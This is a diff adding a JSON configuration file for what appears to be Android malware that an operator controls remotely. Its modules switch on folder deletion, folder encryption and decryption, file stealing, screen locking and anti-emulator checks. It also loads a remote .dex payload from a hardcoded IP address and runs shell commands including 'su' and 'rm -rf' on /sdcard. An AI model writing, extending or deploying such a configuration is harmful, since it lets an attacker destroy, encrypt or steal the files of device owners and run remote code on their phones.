@@ -1,0 +1,60 @@
+{
+  "UserTime": "",
+  "Exit": {
+    "enabled": false
+  },
+  "Delete": {
+    "enabled": false,
+    "dFolder1": "/sdcard/工程2",
+    "dFolder2": "456"
+  },
+  "Encrypt": {
+    "enabled": false,
+    "eFolder1": "/storage/emulated/0/工程",
+    "eFolder2": ""
+  },
+  "Decrypt": {
+    "enabled": false,
+    "decFolder1": "/storage/emulated/0/工程",
+    "decFolder2": ""
+  },
+  "LoadDex": {
+    "enabled": false,
+    "DexUrl": "http://43.136.173.162:11451/AntiRun/LoadDex/classes.dex",
+    "Class": "com.mycompany.appli.Crash",
+    "Method": "test"
+  },
+  "ShowToast": {
+    "enabled": true,
+    "Toast": "By-Crash"
+  },
+  "FileStealer": {
+    "enabled": false,
+    "sFolder1": "/sdcard/工程",
+    "sFolder2": "",
+    "sFolder3": "",
+    "MP4&ZIP_size": "220MB",
+    "File_size": "100MB"
+  },
+  "ExecuteShellCmd": {
+    "enabled": false,
+    "cmd1": "su",
+    "cmd2": "rm -rf /sdcard/工程",
+    "cmd3": "mkdir /sdcard/工程2"
+  },
+  "Bomb": {
+    "enabled": false,
+    "Num": "20",
+    "Times": "15"
+  },
+  "getList": {
+    "enabled": false
+  },
+  "Lock": {
+    "enabled": false
+  },
+  "BanVirtual": {
+    "enabled": false,
+    "minAndroidVersion": "10"
+  }
+}
